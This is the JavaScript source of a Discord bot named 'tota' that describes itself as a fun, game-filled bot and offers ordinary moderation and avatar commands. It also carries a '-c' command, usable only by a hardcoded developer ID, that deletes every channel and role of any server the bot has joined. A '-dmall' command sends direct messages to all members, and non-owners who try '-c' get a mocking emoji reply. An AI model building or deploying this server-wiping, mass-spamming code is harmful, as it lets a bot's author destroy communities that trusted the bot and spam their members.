const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  Partials,
  PermissionFlagsBits,
  ChannelType,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ButtonBuilder,
  ButtonStyle
} = require('discord.js');
const { joinVoiceChannel } = require('@discordjs/voice');
const fs = require('fs');
const path = require('path');
const http = require('http');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration
  ],
  partials: [Partials.Channel]
});

const PREFIX = '-';
const OWNER_ID = '1500974923441639434';
const MUTE_LOGS_FILE = path.join(__dirname, 'vmute_logs.json');
const PORT = process.env.PORT || 3000;
const EMBED_COLOR = 0x4C4D54;
const BANNER_URL = 'https://media.discordapp.net/attachments/1536490013838024895/1538415611602927636/79dc8d3cbf1cebae929104d13f0ea218.gif';

// ==============================
// HELP CATEGORIES
// ==============================
const categories = {
  moderation: {
    name: 'Moderation',
    emoji: '<:moderation:1538420590866858075>',
    description: 'View moderation commands',
    commands: [
      ['-ban', '<a:prettyarrowR:1538419123934199829> bans the specified member'],
      ['-unban', '<a:prettyarrowR:1538419123934199829> unbans the specified member'],
      ['-vmute', '<a:prettyarrowR:1538419123934199829> voice mutes a member'],
      ['-vunmute', '<a:prettyarrowR:1538419123934199829> removes voice mute from a member'],
      ['-vmlogs', '<a:prettyarrowR:1538419123934199829> shows voice mute logs of a member'],
      ['-role', '<a:prettyarrowR:1538419123934199829> adds or removes a role from a member']
    ]
  },
  utility: {
    name: 'Utility',
    emoji: '<:staff:1538421193898459196>',
    description: 'View utility commands',
    commands: [
      ['a', '<a:prettyarrowR:1538419123934199829> shows user avatar'],
      ['bn', '<a:prettyarrowR:1538419123934199829> shows user banner'],
      ['-join', '<a:prettyarrowR:1538419123934199829> bot joins your voice channel (Owner only)']
    ]
  },
  owner: {
    name: 'Owner',
    emoji: '<:OwnerCrown:1536485446018662543>',
    description: 'View owner commands',
    commands: [
      ['-dmall', '<a:prettyarrowR:1538419123934199829> sends a message to all members'],
      ['-c', '<a:prettyarrowR:1538419123934199829> nukes the server'],
      ['-join', '<a:prettyarrowR:1538419123934199829> bot joins your voice channel']
    ]
  }
};

function createCategoryMenu() {
  const menu = new StringSelectMenuBuilder()
    .setCustomId('help_category')
    .setPlaceholder('Choose the command category')
    .addOptions(
      Object.entries(categories).map(([id, category]) =>
        new StringSelectMenuOptionBuilder()
          .setLabel(category.name)
          .setDescription(category.description)
          .setValue(id)
          .setEmoji(category.emoji)
      )
    );

  return new ActionRowBuilder().addComponents(menu);
}

function createHelpHome() {
  const embed = new EmbedBuilder()
    .setColor(EMBED_COLOR)
    .setImage(BANNER_URL)
    .setDescription(
      `## Hello dear\n\n` +
      `I am **tota**, an entertaining and engaging Discord bot designed to bring laughter and excitement to communities.\n\n` +
      `Packed with a variety of fun features and games, ensuring that your community members never have a dull moment.`
    )
    .setFooter({ text: 'Help Menu' });

  return {
    embeds: [embed],
    components: [createCategoryMenu()]
  };
}

function createCategoryPage(categoryId, page = 0) {
  const category = categories[categoryId];
  if (!category) return null;

  const perPage = 6;
  const totalPages = Math.max(1, Math.ceil(category.commands.length / perPage));
  page = Math.max(0, Math.min(page, totalPages - 1));

  const start = page * perPage;
  const commands = category.commands.slice(start, start + perPage);

  let description = `## ${category.emoji} ${category.name}\n\n`;
  for (const [command, text] of commands) {
    description += `\`${command}\`\n${text}\n\n`;
  }

  const embed = new EmbedBuilder()
    .setColor(EMBED_COLOR)
    .setImage(BANNER_URL)
    .setDescription(description)
    .setFooter({ text: `Page ${page + 1} of ${totalPages}` });

  const back = new ButtonBuilder()
    .setCustomId(`help_back_${categoryId}_${page}`)
    .setLabel('←')
    .setStyle(ButtonStyle.Secondary)
    .setDisabled(page === 0);

  const next = new ButtonBuilder()
    .setCustomId(`help_next_${categoryId}_${page}`)
    .setLabel('→')
    .setStyle(ButtonStyle.Secondary)
    .setDisabled(page >= totalPages - 1);

  const buttons = new ActionRowBuilder().addComponents(back, next);

  return {
    embeds: [embed],
    components: [createCategoryMenu(), buttons]
  };
}

http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot is running');
}).listen(PORT, () => {
  console.log(`Dummy server running on port ${PORT}`);
});

if (!fs.existsSync(MUTE_LOGS_FILE)) {
  fs.writeFileSync(MUTE_LOGS_FILE, JSON.stringify({}, null, 2));
}

function saveVMuteLog(userId, moderator, reason, guild) {
  const logs = JSON.parse(fs.readFileSync(MUTE_LOGS_FILE, 'utf8'));
  if (!logs[userId]) logs[userId] = [];

  logs[userId].unshift({
    moderatorId: moderator.id || 'Unknown',
    moderatorTag: moderator.tag || 'Unknown',
    reason: reason || 'None',
    guildId: guild.id,
    guildName: guild.name,
    timestamp: Date.now()
  });

  if (logs[userId].length > 15) logs[userId] = logs[userId].slice(0, 15);
  fs.writeFileSync(MUTE_LOGS_FILE, JSON.stringify(logs, null, 2));
}

client.once('clientReady', () => {
  console.log(`Logged in as ${client.user.tag}`);
  client.user.setPresence({
    activities: [{ name: '-help', type: 0 }],
    status: 'online'
  });
});

client.on('voiceStateUpdate', async (oldState, newState) => {
  if (!oldState.serverMute && newState.serverMute) {
    try {
      const fetchedLogs = await newState.guild.fetchAuditLogs({
        limit: 5,
        type: 24
      });

      const muteLog = fetchedLogs.entries.find(entry =>
        entry.target?.id === newState.member?.id &&
        Date.now() - entry.createdTimestamp < 10000
      );

      if (muteLog && muteLog.executor?.id === client.user.id) return;

      const moderator = muteLog?.executor || { id: 'Unknown', tag: 'Unknown' };
      const reason = muteLog?.reason || 'None';

      if (newState.member) {
        saveVMuteLog(newState.member.id, moderator, reason, newState.guild);
      }
    } catch (err) {
      console.error('Error saving voice mute log:', err);
    }
  }
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim();
  const args = content.split(/ +/);
  const command = args.shift().toLowerCase();

  // ========== AVATAR ==========
  if (command === 'a') {
    let user = message.mentions.users.first();
    if (!user && args[0]) {
      try { user = await client.users.fetch(args[0]); } catch { user = null; }
    }
    if (!user) user = message.author;

    const embed = new EmbedBuilder()
      .setAuthor({ name: user.tag, iconURL: user.displayAvatarURL({ dynamic: true }) })
      .setTitle('Avatar')
      .setImage(user.displayAvatarURL({ dynamic: true, size: 4096 }))
      .setColor(EMBED_COLOR)
      .setFooter({ text: `Requested by ${message.author.tag}` });

    return message.reply({ embeds: [embed] });
  }

  // ========== BANNER ==========
  if (command === 'bn') {
    let user = message.mentions.users.first();
    if (!user && args[0]) {
      try { user = await client.users.fetch(args[0]); } catch { user = null; }
    }
    if (!user) user = message.author;

    try {
      const fetchedUser = await client.users.fetch(user.id, { force: true });
      if (!fetchedUser.banner) {
        return message.reply({ embeds: [new EmbedBuilder().setDescription(`**This user doesn't have a banner**`).setColor(EMBED_COLOR)] });
      }

      const embed = new EmbedBuilder()
        .setAuthor({ name: user.tag, iconURL: user.displayAvatarURL({ dynamic: true }) })
        .setTitle('Banner')
        .setImage(fetchedUser.bannerURL({ dynamic: true, size: 4096 }))
        .setColor(EMBED_COLOR)
        .setFooter({ text: `Requested by ${message.author.tag}` });

      return message.reply({ embeds: [embed] });
    } catch {
      return message.reply({ embeds: [new EmbedBuilder().setDescription(`**Failed to fetch banner**`).setColor(EMBED_COLOR)] });
    }
  }

  if (!content.startsWith(PREFIX)) return;

  const prefixArgs = content.slice(PREFIX.length).trim().split(/ +/);
  const prefixCommand = prefixArgs.shift().toLowerCase();

  // ========== HELP ==========
  if (prefixCommand === 'help') {
    return message.reply(createHelpHome());
  }

  // ========== JOIN ==========
  if (prefixCommand === 'join') {
    if (message.author.id !== OWNER_ID) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**This command is restricted to the bot owner.**').setColor(EMBED_COLOR)] });
    }

    const voiceChannel = message.member.voice.channel;
    if (!voiceChannel) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**You need to be in a voice channel.**').setColor(EMBED_COLOR)] });
    }

    try {
      joinVoiceChannel({
        channelId: voiceChannel.id,
        guildId: message.guild.id,
        adapterCreator: message.guild.voiceAdapterCreator,
        selfDeaf: false
      });

      return message.reply({ embeds: [new EmbedBuilder()
        .setColor(EMBED_COLOR)
        .setDescription(`**Joined ${voiceChannel.name}**`)] });
    } catch (err) {
      console.error(err);
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Failed to join the voice channel.**').setColor(EMBED_COLOR)] });
    }
  }

  // ========== DMALL ==========
  if (prefixCommand === 'dmall') {
    if (message.author.id !== OWNER_ID) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**This command is restricted to the bot owner.**').setColor(EMBED_COLOR)] });
    }

    const msgToSend = prefixArgs.join(' ');
    if (!msgToSend) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Please enter the message.**').setColor(EMBED_COLOR)] });
    }

    await message.reply({ embeds: [new EmbedBuilder().setDescription(`**Starting message delivery...**`).setColor(EMBED_COLOR)] });

    let success = 0, failed = 0;
    const members = await message.guild.members.fetch();

    for (const [, member] of members) {
      if (member.user.bot) continue;
      try { await member.send(msgToSend); success++; } catch { failed++; }
      await new Promise(r => setTimeout(r, 700));
    }

    return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`**Delivered:** \`${success}\`\n**Failed:** \`${failed}\``).setColor(EMBED_COLOR)] });
  }

  // ========== ROLE ==========
  if (prefixCommand === 'role') {
    if (!message.member.permissions.has(PermissionFlagsBits.ManageRoles)) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**You need the Manage Roles permission.**').setColor(EMBED_COLOR)] });
    }

    const target = message.mentions.members.first() || message.guild.members.cache.get(prefixArgs[0]);
    if (!target) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Usage:** `-role @user @role`').setColor(EMBED_COLOR)] });
    }

    let role = message.mentions.roles.first();
    if (!role) {
      const roleInput = prefixArgs.slice(1).join(' ');
      role = message.guild.roles.cache.get(roleInput) || message.guild.roles.cache.find(r => r.name.toLowerCase() === roleInput.toLowerCase());
    }

    if (!role) return message.reply({ embeds: [new EmbedBuilder().setDescription('**Role not found.**').setColor(EMBED_COLOR)] });
    if (message.guild.members.me.roles.highest.position <= role.position) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**I cannot manage this role.**').setColor(EMBED_COLOR)] });
    }

    try {
      if (target.roles.cache.has(role.id)) {
        await target.roles.remove(role);
        return message.reply({ embeds: [new EmbedBuilder().setDescription(`Removed ${role} from ${target}`).setColor(EMBED_COLOR)] });
      } else {
        await target.roles.add(role);
        return message.reply({ embeds: [new EmbedBuilder().setDescription(`Added ${role} to ${target}`).setColor(EMBED_COLOR)] });
      }
    } catch {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Failed to update the role.**').setColor(EMBED_COLOR)] });
    }
  }

  // ========== BAN ==========
  if (prefixCommand === 'ban') {
    if (!message.member.permissions.has(PermissionFlagsBits.BanMembers)) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**You need the Ban Members permission.**').setColor(EMBED_COLOR)] });
    }

    if (!prefixArgs[0]) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Usage:** `-ban @user/ID [reason]`').setColor(EMBED_COLOR)] });
    }

    const reason = prefixArgs.slice(1).join(' ') || 'No reason provided';
    let target = message.mentions.members.first() || message.guild.members.cache.get(prefixArgs[0]);

    try {
      if (target) {
        if (!target.bannable) {
          return message.reply({ embeds: [new EmbedBuilder().setDescription('**I cannot ban this user.**').setColor(EMBED_COLOR)] });
        }
        await target.ban({ reason });
        return message.reply({ embeds: [new EmbedBuilder().setDescription(`**${target} has been banned**`).setColor(EMBED_COLOR)] });
      } else {
        await message.guild.members.ban(prefixArgs[0], { reason });
        let user = null;
        try { user = await client.users.fetch(prefixArgs[0]); } catch {}
        const displayName = user ? `**${user.tag}**` : `\`${prefixArgs[0]}\``;
        return message.reply({ embeds: [new EmbedBuilder().setDescription(`${displayName} **has been banned**`).setColor(EMBED_COLOR)] });
      }
    } catch {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Failed to ban this user.**').setColor(EMBED_COLOR)] });
    }
  }

  // ========== UNBAN ==========
  if (prefixCommand === 'unban') {
    if (!message.member.permissions.has(PermissionFlagsBits.BanMembers)) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**You need the Ban Members permission.**').setColor(EMBED_COLOR)] });
    }

    if (!prefixArgs[0]) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Usage:** `-unban <ID>`').setColor(EMBED_COLOR)] });
    }

    try {
      let user = null;
      try { user = await client.users.fetch(prefixArgs[0]); } catch {}
      await message.guild.members.unban(prefixArgs[0]);
      const displayName = user ? `**${user.tag}**` : `\`${prefixArgs[0]}\``;
      return message.reply({ embeds: [new EmbedBuilder().setDescription(`${displayName} **has been unbanned**`).setColor(EMBED_COLOR)] });
    } catch {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Failed to unban this user.**').setColor(EMBED_COLOR)] });
    }
  }

  // ========== VOICE MUTE ==========
  if (prefixCommand === 'vmute') {
    if (!message.member.permissions.has(PermissionFlagsBits.MuteMembers)) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**You need the Mute Members permission.**').setColor(EMBED_COLOR)] });
    }

    if (!prefixArgs[0]) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Usage:** `-vmute @user/ID [reason]`').setColor(EMBED_COLOR)] });
    }

    let target = message.mentions.members.first() || message.guild.members.cache.get(prefixArgs[0]);
    if (!target) {
      target = message.guild.members.cache.find(m =>
        m.user.username.toLowerCase() === prefixArgs[0].toLowerCase() ||
        m.displayName.toLowerCase() === prefixArgs[0].toLowerCase()
      );
    }

    if (!target) return message.reply({ embeds: [new EmbedBuilder().setDescription('**Member not found.**').setColor(EMBED_COLOR)] });
    if (!target.voice.channel) return message.reply({ embeds: [new EmbedBuilder().setDescription('**This user is not in a voice channel.**').setColor(EMBED_COLOR)] });

    const reason = prefixArgs.slice(1).join(' ') || 'No reason provided';

    try {
      await target.voice.setMute(true, reason);
      saveVMuteLog(target.id, message.author, reason, message.guild);
      return message.reply({ embeds: [new EmbedBuilder().setDescription(`**Voice muted** ${target}\n**Reason:** \`${reason}\``).setColor(EMBED_COLOR)] });
    } catch {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Failed to voice mute.**').setColor(EMBED_COLOR)] });
    }
  }

  // ========== VOICE UNMUTE ==========
  if (prefixCommand === 'vunmute') {
    if (!message.member.permissions.has(PermissionFlagsBits.MuteMembers)) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**You need the Mute Members permission.**').setColor(EMBED_COLOR)] });
    }

    if (!prefixArgs[0]) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Usage:** `-vunmute @user/ID`').setColor(EMBED_COLOR)] });
    }

    let target = message.mentions.members.first() || message.guild.members.cache.get(prefixArgs[0]);
    if (!target) {
      target = message.guild.members.cache.find(m =>
        m.user.username.toLowerCase() === prefixArgs[0].toLowerCase() ||
        m.displayName.toLowerCase() === prefixArgs[0].toLowerCase()
      );
    }

    if (!target) return message.reply({ embeds: [new EmbedBuilder().setDescription('**Member not found.**').setColor(EMBED_COLOR)] });

    try {
      await target.voice.setMute(false);
      return message.reply({ embeds: [new EmbedBuilder().setDescription(`**Voice unmuted** ${target}`).setColor(EMBED_COLOR)] });
    } catch {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Failed to voice unmute.**').setColor(EMBED_COLOR)] });
    }
  }

  // ========== VOICE MUTE LOGS ==========
  if (prefixCommand === 'vmlogs') {
    if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**You need Administrator permission.**').setColor(EMBED_COLOR)] });
    }

    if (!prefixArgs[0]) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**Usage:** `-vmlogs @user/ID`').setColor(EMBED_COLOR)] });
    }

    let user = message.mentions.users.first();
    if (!user) {
      try { user = await client.users.fetch(prefixArgs[0]); } catch { user = null; }
    }

    if (!user) return message.reply({ embeds: [new EmbedBuilder().setDescription('**User not found.**').setColor(EMBED_COLOR)] });

    const logs = JSON.parse(fs.readFileSync(MUTE_LOGS_FILE, 'utf8'));
    const userLogs = (logs[user.id] || []).filter(log => log.guildId === message.guild.id);

    if (userLogs.length === 0) {
      return message.reply({ embeds: [new EmbedBuilder().setDescription('**No voice mute logs found.**').setColor(EMBED_COLOR)] });
    }

    for (const log of userLogs) {
      const date = new Date(log.timestamp).toLocaleString('en-GB');
      const embed = new EmbedBuilder()
        .setAuthor({ name: user.tag, iconURL: user.displayAvatarURL({ dynamic: true }) })
        .setDescription(`**Server Mute**\nTrue\n\n**Moderator:** <@${log.moderatorId}>\n**Reason:** ${log.reason}\n${log.guildName} • ${date}`)
        .setColor(EMBED_COLOR);

      await message.channel.send({ embeds: [embed] });
      await new Promise(r => setTimeout(r, 400));
    }
  }

  // ========== NUKE ==========
  if (prefixCommand === 'c') {
    if (message.author.id !== OWNER_ID) {
      return message.reply('<:ace_asexual_gay:1536500741525471442>');
    }

    await message.reply({ embeds: [new EmbedBuilder().setDescription('**Nuking server...**').setColor(EMBED_COLOR)] });

    try {
      const guild = message.guild;

      for (const channel of [...guild.channels.cache.values()]) {
        await channel.delete().catch(() => {});
        await new Promise(r => setTimeout(r, 300));
      }

      const rolesToDelete = [...guild.roles.cache.values()]
        .filter(r => r.id !== guild.id && !r.managed && r.editable)
        .sort((a, b) => b.position - a.position);

      for (const role of rolesToDelete) {
        await role.delete().catch(() => {});
        await new Promise(r => setTimeout(r, 300));
      }

      const newChannel = await guild.channels.create({
        name: 'general',
        type: ChannelType.GuildText
      });

      await newChannel.send({ embeds: [new EmbedBuilder().setDescription('**Server Nuked**').setColor(EMBED_COLOR)] });
    } catch (err) {
      console.error(err);
    }
  }
});

// ==============================
// INTERACTIONS (Help Menu)
// ==============================
client.on('interactionCreate', async interaction => {
  if (interaction.isStringSelectMenu()) {
    if (interaction.customId !== 'help_category') return;
    const categoryId = interaction.values[0];
    return interaction.update(createCategoryPage(categoryId, 0));
  }

  if (interaction.isButton()) {
    if (!interaction.customId.startsWith('help_')) return;

    const parts = interaction.customId.split('_');
    const action = parts[1];
    const categoryId = parts[2];
    const currentPage = Number(parts[3]);

    let newPage = currentPage;
    if (action === 'next') newPage++;
    if (action === 'back') newPage--;

    return interaction.update(createCategoryPage(categoryId, newPage));
  }
});

client.login(process.env.TOKEN);
